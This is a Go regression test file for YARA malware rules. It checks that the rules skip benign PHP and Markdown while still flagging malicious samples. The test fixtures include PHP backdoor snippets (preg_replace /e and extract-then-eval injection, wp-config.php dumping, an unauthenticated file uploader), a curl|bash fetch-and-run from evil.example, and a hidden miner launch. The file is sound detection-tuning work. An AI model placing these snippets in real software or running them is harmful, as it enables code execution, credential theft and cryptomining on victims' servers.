//go:build yara

package yara

import "testing"

// Regression tests for the dual-use arm of the 2026-07 flood. These rules fired
// on legitimate-but-similar code: old PHPMailer's preg_replace /e encoder, a
// theme's extract($_POST) form unpacking, backup plugins reading wp-config, a
// PHPMailer upload-and-email example, and a curl|sh command shown in a Markdown
// install doc. The fixes require the malicious co-signal (attacker-controlled
// replacement, an injection sink, config display, a non-mailer upload, a
// non-Markdown script).

func TestFPFlood_PregReplaceEval_PhpmailerEncoder(t *testing.T) {
	s := loadRepoYaraScanner(t)
	// Old PHPMailer quoted-printable encoder: /e with a fixed sprintf literal.
	legit := []byte(`<?php $x = preg_replace("/([\(\)\"])/e", "'='.sprintf('%02X', ord('$1'))", $str);`)
	if hasYaraRule(s.ScanBytes(legit), "obfuscation_preg_replace_eval") {
		t.Error("obfuscation_preg_replace_eval FP: matched PHPMailer's fixed /e encoder")
	}
	for _, mal := range [][]byte{
		[]byte(`<?php preg_replace('/.*/e', $_POST['code'], $subject);`),
		[]byte(`<?php preg_replace("/(.+)/e", "eval(base64_decode('ZXZpbA=='))", $s);`),
	} {
		if !hasYaraRule(s.ScanBytes(mal), "obfuscation_preg_replace_eval") {
			t.Errorf("obfuscation_preg_replace_eval regression: real /e code injection not detected: %s", mal)
		}
	}
}

func TestFPFlood_ExtractGlobals_ThemeFormUnpack(t *testing.T) {
	s := loadRepoYaraScanner(t)
	legit := []byte(`<?php function handle(){ extract($_POST); switch($action){ case 'save': save_option($key,$value); break; } }`)
	if hasYaraRule(s.ScanBytes(legit), "obfuscation_extract_globals") {
		t.Error("obfuscation_extract_globals FP: matched a theme form-field unpack")
	}
	for _, mal := range [][]byte{
		[]byte(`<?php extract($_REQUEST); $func($arg);`),
		[]byte(`<?php extract($_GET); eval($code);`),
	} {
		if !hasYaraRule(s.ScanBytes(mal), "obfuscation_extract_globals") {
			t.Errorf("obfuscation_extract_globals regression: real variable-injection backdoor not detected: %s", mal)
		}
	}
}

func TestFPFlood_WpConfigStealer_BackupPlugin(t *testing.T) {
	s := loadRepoYaraScanner(t)
	// Backuply/dropbox-backup: reads and rewrites wp-config for restore, and
	// references DB_PASSWORD, but never displays the config to the browser.
	legit := []byte(`<?php $c = file_get_contents($data['softpath'].'/wp-config.php'); $c = str_replace(DB_PASSWORD, $new, $c); file_put_contents($dest.'/wp-config.php', $c);`)
	if hasYaraRule(s.ScanBytes(legit), "exploit_wp_config_stealer") {
		t.Error("exploit_wp_config_stealer FP: matched a backup/restore plugin")
	}
	for _, mal := range [][]byte{
		[]byte(`<?php echo file_get_contents('wp-config.php'); // DB_PASSWORD DB_USER`),
		[]byte(`<?php $c=file_get_contents('../wp-config.php'); print($c); // DB_PASSWORD`),
		[]byte(`<?php readfile('/home/x/public_html/wp-config.php');`),
	} {
		if !hasYaraRule(s.ScanBytes(mal), "exploit_wp_config_stealer") {
			t.Errorf("exploit_wp_config_stealer regression: real config stealer not detected: %s", mal)
		}
	}
}

func TestFPFlood_UploaderNoAuth_MailerExample(t *testing.T) {
	s := loadRepoYaraScanner(t)
	// PHPMailer send_file_upload example: moves the upload then emails it.
	legit := []byte(`<?php require '../PHPMailerAutoload.php'; $mail = new PHPMailer; if(move_uploaded_file($_FILES['userfile']['tmp_name'], $uploadfile)){ $mail->addAttachment($uploadfile); $mail->send(); }`)
	if hasYaraRule(s.ScanBytes(legit), "dropper_uploader_no_auth") {
		t.Error("dropper_uploader_no_auth FP: matched a PHPMailer upload-and-email example")
	}
	mal := []byte(`<?php move_uploaded_file($_FILES['f']['tmp_name'], './'.$_FILES['f']['name']); echo 'uploaded';`)
	if !hasYaraRule(s.ScanBytes(mal), "dropper_uploader_no_auth") {
		t.Error("dropper_uploader_no_auth regression: real no-auth shell uploader not detected")
	}
}

func TestFPFlood_WgetPipeAndBashrc_MarkdownDoc(t *testing.T) {
	s := loadRepoYaraScanner(t)
	// node-gyp macOS_Catalina.md: a curl | sh command shown in a Markdown doc.
	md := []byte("## Fixing errors\n\nRun the acid test:\n\n```\ncurl -sL https://github.com/nodejs/node-gyp/raw/master/acid_test.sh | bash\n```\n\nSee the [guide](https://github.com/nodejs/node-gyp).\n")
	if hasYaraRule(s.ScanBytes(md), "dropper_wget_pipe_exec") {
		t.Error("dropper_wget_pipe_exec FP: matched a curl|sh command in a Markdown doc")
	}
	if hasYaraRule(s.ScanBytes(md), "backdoor_bashrc_injection") {
		t.Error("backdoor_bashrc_injection FP: matched a Markdown install doc")
	}
	mal := []byte("#!/bin/bash\ncurl -s http://evil.example/x.sh | bash\n")
	if !hasYaraRule(s.ScanBytes(mal), "dropper_wget_pipe_exec") {
		t.Error("dropper_wget_pipe_exec regression: real download-and-pipe not detected")
	}
	rc := []byte("nohup /tmp/.miner --config /tmp/.c &\n")
	if !hasYaraRule(s.ScanBytes(rc), "backdoor_bashrc_injection") {
		t.Error("backdoor_bashrc_injection regression: real rc backdoor not detected")
	}
}
